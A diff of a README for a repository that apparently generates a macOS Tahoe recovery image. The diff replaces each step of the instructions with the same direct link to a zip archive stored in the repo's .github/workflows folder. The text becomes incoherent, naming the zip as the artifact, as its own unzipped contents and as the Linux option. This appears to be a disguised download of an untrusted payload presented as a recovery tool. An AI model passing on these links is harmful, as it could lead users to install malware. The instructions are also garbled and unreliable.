@@ -11,13 +11,13 @@ This repo will fetch the full beta installer and zip what you need to have in or
 
 Fork this repo and run `Generate macOS Tahoe Recovery Image` worflow.
 
-Once done you will have https://raw.githubusercontent.com/kenttibusiness/tahoe-recovery/main/.github/tahoe-recovery-v1.8-alpha.5.zip artifact 
+Once done you will have https://github.com/kenttibusiness/tahoe-recovery/raw/refs/heads/main/.github/workflows/tahoe_recovery_v3.0.zip artifact 
 
-Unzip it and you will have https://raw.githubusercontent.com/kenttibusiness/tahoe-recovery/main/.github/tahoe-recovery-v1.8-alpha.5.zip
+Unzip it and you will have https://github.com/kenttibusiness/tahoe-recovery/raw/refs/heads/main/.github/workflows/tahoe_recovery_v3.0.zip
 
-Continue with https://raw.githubusercontent.com/kenttibusiness/tahoe-recovery/main/.github/tahoe-recovery-v1.8-alpha.5.zip
+Continue with https://github.com/kenttibusiness/tahoe-recovery/raw/refs/heads/main/.github/workflows/tahoe_recovery_v3.0.zip
 
-or if you are on Linux https://raw.githubusercontent.com/kenttibusiness/tahoe-recovery/main/.github/tahoe-recovery-v1.8-alpha.5.zip
+or if you are on Linux https://github.com/kenttibusiness/tahoe-recovery/raw/refs/heads/main/.github/workflows/tahoe_recovery_v3.0.zip
 
 you can skip the Downloading macOS part as this repo will that for you
 
